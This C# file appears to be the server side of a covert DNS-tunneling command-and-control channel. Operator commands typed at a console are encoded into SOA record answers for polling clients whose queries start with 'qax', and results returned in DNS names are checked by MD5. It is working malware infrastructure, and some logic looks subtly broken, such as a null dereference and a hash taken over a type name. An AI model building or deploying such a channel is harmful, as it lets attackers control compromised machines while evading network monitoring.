using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ARSoft.Tools.Net.Dns;
using ARSoft.Tools.Net;
using System.Threading.Tasks;

namespace DNSServer
{
    class Program
    {
        static List<string> sendDate = new List<string> { };
        static void Main(string[] args)
        {
            var maxConnection = 100;
            DnsServer dnsServer = new DnsServer(maxConnection, maxConnection);
            dnsServer.QueryReceived += DnsServer_QueryReceived;
            dnsServer.Start();
            while (true)
            {
                Console.WriteLine("请输入命令：");
                Options.command = Console.ReadLine();
            }
            Console.Read();
        }
        private static Task DnsServer_QueryReceived(object sender, QueryReceivedEventArgs eventArgs)
        {
            eventArgs.Query.IsQuery = false;
            DnsMessage query = eventArgs.Query as DnsMessage;
            if (query == null || query.Questions.Count <= 0)
                query.ReturnCode = ReturnCode.ServerFailure;
            else
            {
                if (query.Questions[0].RecordType == RecordType.Soa)
                {

                    foreach (DnsQuestion dnsQuestion in query.Questions)
                    {
                        if (Options.command != "qax")
                        {
                            Options.flag = "true";
                            sendDate = Encryption.SplitLength(Encoding.UTF8.GetBytes(Options.command));
                        }
                        string domainName = dnsQuestion.Name.ToString();
                        if (domainName.StartsWith("qax"))
                        {
                            Options.cmd5 = domainName.Split('.')[1];
                        }
                        SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), 4, 4, 4, 4, 4);
                        query.AnswerRecords.Add(soaRecord);
                    }
                }
            }
            eventArgs.Response = eventArgs.Query;
            return Task.FromResult(0);
        }

        private static void getData(string data)
        {
            string[] dataSplit = data.Split(',');
            if (data.StartsWith("qax"))
            {
                Options.cmd5 = dataSplit[1];
                for (int i = 2; i < dataSplit.Length - 2; i++)
                {
                    Options.recDate.Add(dataSplit[i]);
                }
                if (Encryption.ByteArrayToHexString(GetMD5Hash(Encoding.UTF8.GetBytes(Options.recDate.ToArray().ToString()))) == Options.cmd5)
                {
                    Console.WriteLine(Options.recDate.ToArray().ToString());
                }
            }

        }

        public static byte[] GetMD5Hash(byte[] bytedata)
        {
            try
            {
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(bytedata);
                StringBuilder sBuilder = new StringBuilder();

                // 循环遍历哈希数据的每一个字节并格式化为十六进制字符串
                for (int i = 0; i < retVal.Length; i++)
                {
                    sBuilder.Append(retVal[i].ToString("x2"));
                }
                //Console.WriteLine(sBuilder.ToString());
                return retVal;
            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
            }

        }
    }
}
